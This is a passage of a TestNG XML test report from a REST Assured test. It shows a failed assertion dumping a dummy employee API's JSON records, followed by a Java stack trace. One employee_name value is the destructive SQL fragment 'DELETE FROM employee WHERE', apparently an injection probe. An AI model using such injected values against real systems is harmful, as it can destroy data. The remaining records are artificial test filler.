2019-09-21:03-15-05&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;0&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57464&quot;,&quot;employee_name&quot;:&quot;stest&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57467&quot;,&quot;employee_name&quot;:&quot;sstest&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57469&quot;,&quot;employee_name&quot;:&quot;sstests&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57472&quot;,&quot;employee_name&quot;:&quot;Dilshan_984&quot;,&quot;employee_salary&quot;:&quot;25000&quot;,&quot;employee_age&quot;:&quot;30&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57473&quot;,&quot;employee_name&quot;:&quot;Dilshan_281&quot;,&quot;employee_salary&quot;:&quot;25000&quot;,&quot;employee_age&quot;:&quot;30&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57475&quot;,&quot;employee_name&quot;:&quot;sharad&quot;,&quot;employee_salary&quot;:&quot;5000&quot;,&quot;employee_age&quot;:&quot;25&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57484&quot;,&quot;employee_name&quot;:&quot;skjfdh&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57488&quot;,&quot;employee_name&quot;:&quot;fv&quot;,&quot;employee_salary&quot;:&quot;0&quot;,&quot;employee_age&quot;:&quot;22&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57496&quot;,&quot;employee_name&quot;:&quot;tefffwlxzst&quot;,&quot;employee_salary&quot;:&quot;1&quot;,&quot;employee_age&quot;:&quot;10&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57498&quot;,&quot;employee_name&quot;:&quot;23453&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57501&quot;,&quot;employee_name&quot;:&quot;jjjjjjjjjjaa&quot;,&quot;employee_salary&quot;:&quot;747383&quot;,&quot;employee_age&quot;:&quot;55&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57505&quot;,&quot;employee_name&quot;:&quot;Hoang 637046702818295157&quot;,&quot;employee_salary&quot;:&quot;500&quot;,&quot;employee_age&quot;:&quot;28&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57510&quot;,&quot;employee_name&quot;:&quot;abc1233434&quot;,&quot;employee_salary&quot;:&quot;2147483647&quot;,&quot;employee_age&quot;:&quot;4343430&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57511&quot;,&quot;employee_name&quot;:&quot;xyz1234343&quot;,&quot;employee_salary&quot;:&quot;403343000&quot;,&quot;employee_age&quot;:&quot;303434&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57512&quot;,&quot;employee_name&quot;:&quot;pqr13434323&quot;,&quot;employee_salary&quot;:&quot;803434000&quot;,&quot;employee_age&quot;:&quot;53430&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57518&quot;,&quot;employee_name&quot;:&quot;abc18787233434&quot;,&quot;employee_salary&quot;:&quot;2147483647&quot;,&quot;employee_age&quot;:&quot;434&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57519&quot;,&quot;employee_name&quot;:&quot;xyz12sdx34343&quot;,&quot;employee_salary&quot;:&quot;40334&quot;,&quot;employee_age&quot;:&quot;303&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57520&quot;,&quot;employee_name&quot;:&quot;pqrsds13434323&quot;,&quot;employee_salary&quot;:&quot;80343&quot;,&quot;employee_age&quot;:&quot;53&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57522&quot;,&quot;employee_name&quot;:&quot;Ashok&quot;,&quot;employee_salary&quot;:&quot;100000&quot;,&quot;employee_age&quot;:&quot;47&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57526&quot;,&quot;employee_name&quot;:&quot;Name987&quot;,&quot;employee_salary&quot;:&quot;997&quot;,&quot;employee_age&quot;:&quot;49&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57528&quot;,&quot;employee_name&quot;:&quot;Name530&quot;,&quot;employee_salary&quot;:&quot;1678&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57529&quot;,&quot;employee_name&quot;:&quot;ttest&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57531&quot;,&quot;employee_name&quot;:&quot;tttest&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57533&quot;,&quot;employee_name&quot;:&quot;af987&quot;,&quot;employee_salary&quot;:&quot;123&quot;,&quot;employee_age&quot;:&quot;23&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57534&quot;,&quot;employee_name&quot;:&quot;dilu&quot;,&quot;employee_salary&quot;:&quot;65000&quot;,&quot;employee_age&quot;:&quot;35&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57535&quot;,&quot;employee_name&quot;:&quot;JohnOH&quot;,&quot;employee_salary&quot;:&quot;28646&quot;,&quot;employee_age&quot;:&quot;74&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57538&quot;,&quot;employee_name&quot;:&quot;Aryan&quot;,&quot;employee_salary&quot;:&quot;10000000&quot;,&quot;employee_age&quot;:&quot;47&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57539&q
[...]
3","employee_age":"2456","profile_image":""},{"id":"58300","employee_name":"salman khan4","employee_salary":"325433","employee_age":"25","profile_image":""},{"id":"58306","employee_name":"salman khan11","employee_salary":"325433","employee_age":"25","profile_image":""},{"id":"58307","employee_name":"sai Gunjal","employee_salary":"325433","employee_age":"25","profile_image":""},{"id":"58308","employee_name":"Sonali","employee_salary":"325433","employee_age":"25","profile_image":""},{"id":"58310","employee_name":"firoj shaikh","employee_salary":"325433","employee_age":"25","profile_image":""},{"id":"58312","employee_name":"shiva10712 terrekhan","employee_salary":"3244353","employee_age":"2456","profile_image":""},{"id":"58313","employee_name":"Akshit","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58315","employee_name":"Akshit1","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58316","employee_name":"BDW","employee_salary":"123","employee_age":"123","profile_image":""},{"id":"58322","employee_name":"sridhar","employee_salary":"0","employee_age":"40","profile_image":""},{"id":"58323","employee_name":"abcd1","employee_salary":"1231","employee_age":"24","profile_image":""},{"id":"58329","employee_name":"Name259","employee_salary":"1171","employee_age":"17","profile_image":""},{"id":"58331","employee_name":"Name286","employee_salary":"155","employee_age":"31","profile_image":""},{"id":"58332","employee_name":"Name752","employee_salary":"1799","employee_age":"59","profile_image":""},{"id":"58334","employee_name":"Name538","employee_salary":"661","employee_age":"42","profile_image":""},{"id":"58337","employee_name":"ssssss","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58359","employee_name":"gopal","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58361","employee_name":"hrsil","employee_salary":"8545","employee_age":"85","profile_image":""},{"id":"58362","employee_name":"abhi","employee_salary":"100000","employee_age":"23","profile_image":""},{"id":"58365","employee_name":"shubh","employee_salary":"100000","employee_age":"23","profile_image":""},{"id":"58367","employee_name":"shubh1","employee_salary":"100000","employee_age":"23","profile_image":""},{"id":"58368","employee_name":"shubh2","employee_salary":"100000","employee_age":"23","profile_image":""},{"id":"58369","employee_name":"jdshdj","employee_salary":"21","employee_age":"441","profile_image":""},{"id":"58372","employee_name":"sridhar1","employee_salary":"0","employee_age":"40","profile_image":""},{"id":"58375","employee_name":"shubh3","employee_salary":"0","employee_age":"23","profile_image":""},{"id":"58377","employee_name":"John1yQuAr","employee_salary":"10657","employee_age":"10","profile_image":""},{"id":"58378","employee_name":"John1gAgBN","employee_salary":"3797","employee_age":"16","profile_image":""},{"id":"58379","employee_name":"DELETE FROM employee WHERE","employee_salary":"0","employee_age":"23","profile_image":""},{"id":"58380","employee_name":"John1TKsNY","employee_salary":"14330","employee_age":"14","profile_image":""},{"id":"58385","employee_name":"Name614","employee_salary":"916","employee_age":"6","profile_image":""},{"id":"58392","employee_name":"svsdvadfdvsb29","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58393","employee_name":"svsdfadfddvd30","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58395","employee_name":"Name554","employee_salary":"1604","employee_age":"42","profile_image":""},{"id":"58398","employee_name":"Name456","employee_salary":"599","employee_age":"19","profile_image":""},{"id":"58399","employee_name":"Name778","employee_salary":"1867","employee_age":"0","profile_image":""},{"id":"58401","employee_name":"Name793","employee_salary":"1811","employee_age":"56","profile_image":""},{"id":"58402","employee_name":"tammy133","employee_salary":"5000","employee_age":"20","profile_image":""},{"id":"58403","employee_name":"Name777","employee_salary":"8","employee_age":"68","profile_image":""},{"id":"58405","employee_name":"Name14","employee_salary":"268","employee_age":"63","profile_image":""},{"id":"58408","employee_name":"Name280","employee_salary":"1017","employee_age":"56","profile_image":""},{"id":"58410","employee_name":"Name875","employee_salary":"1785","employee_age":"60","profile_image":""},{"id":"58411","employee_name":"svsdvadfdvsb31","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58412","employee_name":"svsdfadfddvd32","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58416","employee_name":"test2585","employee_salary":"12345","employee_age":"23","profile_image":""},{"id":"58417","employee_name":"svsdvadfdvsb33","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58418","employee_name":"svsdfadfddvd34","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58420","employee_name":"svsdvadfdvsb35","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58421","employee_name":"svsdfadfddvd36","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58423","employee_name":"dan4","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58424","employee_name":"svsdvadfdvsb37","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58425","employee_name":"svsdfadfddvd38","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58429","employee_name":"svsdvadfdvsb39","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58430","employee_name":"svsdfadfddvd40","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58432","employee_name":"tttttt","employee_salary":"2522","employee_age":"87","profile_image":""},{"id":"58433","employee_name":"ighfj","employee_salary":"1212","employee_age":"52","profile_image":""},{"id":"58434","employee_name":"svsdvadfdvsb41","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58435","employee_name":"svsdfadfddvd42","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58438","employee_name":"svsdvadfdvsb43","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58439","employee_name":"svsdfadfddvd44","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58442","employee_name":"svsdvadfdvsb45","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58443","employee_name":"svsdfadfddvd46","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58448","employee_name":"22\/9\/2019","employee_salary":"213","employee_age":"1232","profile_image":""},{"id":"58449","employee_name":"ewrewrwe","employee_salary":"3432","employee_age":"23432","profile_image":""},{"id":"58450","employee_name":"erwerwerf","employee_salary":"234","employee_age":"324","profile_image":""},{"id":"58451","employee_name":"reretret","employee_salary":"324","employee_age":"234324","profile_image":""},{"id":"58455","employee_name":"Name453","employee_salary":"777","employee_age":"16","profile_image":""},{"id":"58457","employee_name":"Name225","employee_salary":"388","employee_age":"28","profile_image":""},{"id":"58458","employee_name":"Mathew","employee_salary":"5000","employee_age":"21","profile_image":""},{"id":"58459","employee_name":"Name619","employee_salary":"1211","employee_age":"51","profile_image":""},{"id":"58461","employee_name":"fdgdfgfdg","employee_salary":"23","employee_age":"32","profile_image":""},{"id":"58462","employee_name":"Name449","employee_salary":"1890","employee_age":"18","profile_image":""},{"id":"58468","employee_name":"Name939","employee_salary":"216","employee_age":"29","profile_image":""},{"id":"58474","employee_name":"jgjytrth","employee_salary":"45","employee_age":"345","profile_image":""},{"id":"58476","employee_name":"newName2","employee_salary":"0","employee_age":"0","profile_image":""},{"id":"58477","employee_name":"abc","employee_salary":"3333","employee_age":"57","profile_image":""},{"id":"58478","employee_name":"def","employee_salary":"2222","employee_age":"78","profile_image":""},{"id":"58482","employee_name":"ghi","employee_salary":"1111","employee_age":"46","profile_image":""},{"id":"58483","employee_name":"Name657","employee_salary":"1202","employee_age":"28","profile_image":""},{"id":"58485","employee_name":"Name606","employee_salary":"419","employee_age":"66","profile_image":""},{"id":"58490","employee_name":"Name395","employee_salary":"181","employee_age":"41","profile_image":""},{"id":"58493","employee_name":"Name299","employee_salary":"1970","employee_age":"20","profile_image":""},{"id":"58495","employee_name":"Name984","employee_salary":"819","employee_age":"16","profile_image":""},{"id":"58496","employee_name":"werwer","employee_salary":"324","employee_age":"234","profile_image":""},{"id":"58502","employee_name":"defg","employee_salary":"2222","employee_age":"78","profile_image":""},{"id":"58503","employee_name":"ghij","employee_salary":"1111","employee_age":"46","profile_image":""},{"id":"58514","employee_name":"deg","employee_salary":"2222","employee_age":"78","profile_image":""},{"id":"58515","employee_name":"ghj","employee_salary":"1111","employee_age":"46","profile_image":""},{"id":"58516","employee_name":"abvd","employee_salary":"3333","employee_age":"58","profile_image":""},{"id":"58517","employee_name":"bdeg","employee_salary":"2222","employee_age":"78","profile_image":""},{"id":"58518","employee_name":"ghbj","employee_salary":"1111","employee_age":"46","profile_image":""},{"id":"58522","employee_name":"abv9d","employee_salary":"3333","employee_age":"598","profile_image":""},{"id":"58523","employee_name":"bdeg9","employee_salary":"2222","employee_age":"78","profile_image":""},{"id":"58524","employee_name":"gh9bj","employee_salary":"1111","employee_age":"46","profile_image":""},{"id":"58525","employee_name":"svsdvadfdvsb47","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58526","employee_name":"svsdfadfddvd48","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58528","employee_name":"rewttre","employee_salary":"213","employee_age":"213","profile_image":""},{"id":"58529","employee_name":"wololo","employee_salary":"234","employee_age":"234","profile_image":""},{"id":"58530","employee_name":"walala","employee_salary":"232","employee_age":"213","profile_image":""},{"id":"58534","employee_name":"svsdvadfdvsb51","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58535","employee_name":"svsdfadfddvd52","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58547","employee_name":"Swati","employee_salary":"10000","employee_age":"23","profile_image":""},{"id":"58548","employee_name":"jayanth","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58549","employee_name":"Roja","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58550","employee_name":"svsdvadfdvsb53","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58551","employee_name":"svsdfadfddvd54","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58553","employee_name":"svsdvadfdvsb55","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58554","employee_name":"svsdfadfddvd56","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58556","employee_name":"melania","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58557","employee_name":"akshatha","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58559","employee_name":"Siva","employee_salary":"123","employee_age":"32","profile_image":""},{"id":"58560","employee_name":"mela","employee_salary":"15000","employee_age":"23","profile_image":""},{"id":"58561","employee_name":"sneha","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58563","employee_name":"SivaKumari","employee_salary":"4000","employee_age":"32","profile_image":""},{"id":"58564","employee_name":"marco","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58568","employee_name":"krithy","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58569","employee_name":"Vindhya","employee_salary":"4000","employee_age":"32","profile_image":""},{"id":"58570","employee_name":"Maciej Falkiewicz jest najlepszym programista :D","employee_salary":"10","employee_age":"26","profile_image":""},{"id":"58574","employee_name":"prabha","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58575","employee_name":" Radwa1","employee_salary":"10000000","employee_age":"25","profile_image":""},{"id":"58577","employee_name":"Saitej","employee_salary":"123","employee_age":"32","profile_image":""},{"id":"58587","employee_name":"IGI","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58591","employee_name":"Verification of nothing","employee_salary":"10","employee_age":"222","profile_image":""},{"id":"58601","employee_name":"svsdvadfdvsb57","employee_salary":"13236","employee_age":"24","profile_image":""},{"id":"58602","employee_name":"svsdfadfddvd58","employee_salary":"1364","employee_age":"20","profile_image":""},{"id":"58608","employee_name":"MuralidharG","employee_salary":"43000","employee_age":"35","profile_image":""},{"id":"58621","employee_name":"jagadeesh","employee_salary":"100000","employee_age":"23","profile_image":""},{"id":"58630","employee_name":"Vrishti","employee_salary":"45","employee_age":"32","profile_image":""},{"id":"58633","employee_name":"sr1","employee_salary":"100","employee_age":"30","profile_image":""},{"id":"58634","employee_name":"sr2","employee_salary":"110","employee_age":"40","profile_image":""},{"id":"58635","employee_name":"sr3","employee_salary":"120","employee_age":"50","profile_image":""},{"id":"58636","employee_name":"sr4","employee_salary":"130","employee_age":"60","profile_image":""},{"id":"58637","employee_name":"sr5","employee_salary":"140","employee_age":"70","profile_image":""},{"id":"58641","employee_name":"ali","employee_salary":"1000","employee_age":"30","profile_image":""},{"id":"58643","employee_name":" Radwa2","employee_salary":"10000","employee_age":"23","profile_image":""},{"id":"58646","employee_name":"shafeek","employee_salary":"123","employee_age":"23","profile_image":""},{"id":"58648","employee_name":"Saanvi","employee_salary":"222","employee_age":"23","profile_image":""}]

at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:488)
at org.codehaus.groovy.reflection.CachedConstructor.invoke(CachedConstructor.java:83)
at org.codehaus.groovy.reflection.CachedConstructor.doConstructorInvoke(CachedConstructor.java:77)
at org.codehaus.groovy.runtime.callsite.ConstructorSite$ConstructorSiteNoUnwrap.callConstructor(ConstructorSite.java:84)
at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallConstructor(CallSiteArray.java:60)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callConstructor(AbstractCallSite.java:235)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callConstructor(AbstractCallSite.java:247)
at io.restassured.internal.ResponseSpecificationImpl$HamcrestAssertionClosure.validate(ResponseSpecificationImpl.groovy:451)
at io.restassured.internal.ResponseSpecificationImpl$HamcrestAssertionClosure$validate$1.call(Unknown Source)
at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:48)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:113)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:125)
at io.restassured.internal.ResponseSpecificationImpl.validateResponseIfRequired(ResponseSpecificationImpl.groovy:613)
at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.base/java.lang.reflect.Method.invoke(Method.java:564)
at org.codehaus.groovy.runtime.callsite.PogoMetaMethodSite$PogoCachedMethodSiteNoUnwrapNoCoerce.invoke(PogoMetaMethodSite.java:210)
at org.codehaus.groovy.runtime.callsite.PogoMetaMethodSite.callCurrent(PogoMetaMethodSite.java:59)
at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallCurrent(CallSiteArray.java:52)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:154)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:166)
at io.restassured.internal.ResponseSpecificationImpl.content(ResponseSpecificationImpl.groovy:251)
at io.restassured.specification.ResponseSpecification$content$0.callCurrent(Unknown Source)
at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallCurrent(CallSiteArray.java:52)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:154)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:190)
at io.restassured.internal.ResponseSpecificationImpl.body(ResponseSpecificationImpl.groovy:234)
at io.restassured.internal.ValidatableResponseOptionsImpl.body(ValidatableResponseOptionsImpl.java:268)
at com.BDD.Tests.validateSingleandMultipleContents.testMutipleContent(validateSingleandMultipleContents.java:31)
at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.base/java.lang.reflect.Method.invoke(Method.java:564)
at org.testng.internal.MethodInvocationHelper.invokeMethod(MethodInvocationHelper.java:133)
at org.testng.internal.TestInvoker.invokeMethod(TestInvoker.java:584)
at org.testng.internal.TestInvoker.invokeTestMethod(TestInvoker.java:172)
at org.testng.internal.MethodRunner.runInSequence(MethodRunner.java:46)
at org.testng.internal.TestInvoker$MethodInvocationAgent.invoke(TestInvoker.java:804)
at org.testng.internal.TestInvoker.invokeTestMethods(TestInvoker.java:145)
at org.testng.internal.TestMethodWorker.invokeTestMethods(TestMethodWorker.java:146)
at org.testng.internal.TestMethodWorker.run(TestMethodWorker.java:128)
at java.base/java.util.ArrayList.forEach(ArrayList.java:1378)
at org.testng.TestRunner.privateRun(TestRunner.java:770)
at org.testng.TestRunner.run(TestRunner.java:591)
at org.testng.SuiteRunner.runTest(SuiteRunner.java:402)
at org.testng.SuiteRunner.runSequentially(SuiteRunner.java:396)
at org.testng.SuiteRunner.privateRun(SuiteRunner.java:355)
at org.testng.SuiteRunner.run(SuiteRunner.java:304)
at org.testng.SuiteRunnerWorker.runSuite(SuiteRunnerWorker.java:53)
at org.testng.SuiteRunnerWorker.run(SuiteRunnerWorker.java:96)
at org.testng.TestNG.runSuitesSequentially(TestNG.java:1180)
at org.testng.TestNG.runSuitesLocally(TestNG.java:1102)
at org.testng.TestNG.runSuites(TestNG.java:1032)
at org.testng.TestNG.run(TestNG.java:1000)
at org.testng.remote.AbstractRemoteTestNG.run(AbstractRemoteTestNG.java:115)
at org.testng.remote.RemoteTestNG.initAndRun(RemoteTestNG.java:251)
at org.testng.remote.RemoteTestNG.main(RemoteTestNG.java:77)
]]>
    </failure>
  </testcase> <!-- testMutipleContent -->
  <testcase classname="com.BDD.Tests.validateSingleandMultipleContents" name="testSingleContent" time="2.666"/>
</testsuite> <!-- com.BDD.Tests.validateSingleandMultipleContents -->
